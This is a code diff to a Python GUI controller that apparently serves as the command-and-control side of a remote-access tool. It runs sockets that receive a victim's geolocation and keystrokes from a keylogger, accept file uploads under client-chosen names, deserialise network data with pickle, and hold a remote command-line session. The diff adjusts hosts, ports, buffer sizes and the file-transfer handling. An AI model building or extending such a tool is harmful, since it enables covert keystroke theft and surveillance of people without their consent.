@@ -6,7 +6,7 @@ import tkintermapview
 import subprocess
 import time
 import pickle
-import os
+
 
 class App(customtkinter.CTk):
     SERVER_SOCKETS= [] 
@@ -91,8 +91,8 @@ class App(customtkinter.CTk):
             print("Server started the keylog socket.")
 
         def createKeylogSocket():
-            HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
-            PORT = 65432  # Port to listen on (non-privileged ports are > 1023)
+            HOST = "127.0.0.89"  # Standard loopback interface address (localhost)
+            PORT = 65230  # Port to listen on (non-privileged ports are > 1023)
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 # Add the server socket to a list
                 self.SERVER_SOCKETS.append(s)
@@ -104,7 +104,7 @@ class App(customtkinter.CTk):
                 with conn:
                     print(f"KEYLOGGER: Connected by {addr}")
                     # Recieve geo data before key logging
-                    self.USER_GEOLOCATIONS.append(conn.recv(24).decode("utf-8"))
+                    self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
                     self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                     while True:
                         data = conn.recv(1024).decode("utf-8") 
@@ -137,7 +137,7 @@ class App(customtkinter.CTk):
                     data = conn.recv(1024)
                     data = pickle.loads(data)
                     print(data)
-
+      
         def start_file_transfer_socket():
             t5 = threading.Thread(target=create_file_transfer_socket)
             t5.daemon = True
@@ -155,22 +155,32 @@ class App(customtkinter.CTk):
                     conn, addr = s.accept()
 
                     while True:
-                        msg = conn.recv(1024).decode("utf-8")
-                        cmd, data = msg.split(":")
+                        msg = conn.recv(64).decode("utf-8")
+                        if msg:
+                            cmd, data = msg.split(":")
 
-                        if cmd == "FILENAME":
-                            new_file = open(data, "w")
-                            print("Created File")
-                        elif cmd == "DATA":
-                            new_file.write(data)
-                            print("Writing Data")
-                        elif cmd == "FINISH":
-                            new_file.close()
-                            print("Finished writing data")
-                        elif cmd == "CLOSE":
-                            conn.close()
-                            break
-            
+                            match cmd:
+                                case "FILENAME":
+                                    print(f"\nCreated file: {msg}")
+                                    new_file = open(f"{data}", "w")
+                                    msg = ""
+
+                                case "DATA":
+                                    print(f"\nWriting to file: {msg}")
+                                    new_file.write(data)
+                                    msg = ""
+                                
+                                case "FINISH":
+                                    print(f"\nClosing the file: {msg}")
+                                    new_file.close()
+                                    msg = ""
+                                
+                                case "CLOSE":
+                                    print(f"\nClosing the FT socket: {msg}")
+                                    #conn.close()
+                                    msg = ""
+                                    #break
+         
         start_file_name_socket()
         start_file_transfer_socket()
 
@@ -185,7 +195,7 @@ class App(customtkinter.CTk):
             HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
             PORT = 12345  # Port to listen on (non-privileged ports are > 1023)
 
-            #? This makes sure that we dont loose connection for too long
+                        #? This makes sure that we dont loose connection for too long
             def wake_up():
                 wake_tries = 0
                 time.sleep(10)
@@ -199,7 +209,8 @@ class App(customtkinter.CTk):
                 wake_tries+=1
                 if wake_tries >= 60:
                     print("CLI_Error: Chosen client is offline, terminating socket.")
-                    cli.close()
+                    cli.close() 
+                wake_up()
 
             # Start  CLI socket
             while True:
@@ -210,7 +221,7 @@ class App(customtkinter.CTk):
                     print("CLI_Success: Connected to CLI client.")
                     break
                 except Exception as e: print(f"Thrown Exception CLI: {e}")
-                wake_up()
+                #wake_up()
 
         start_CLI_socket()    
     ############################################################################################
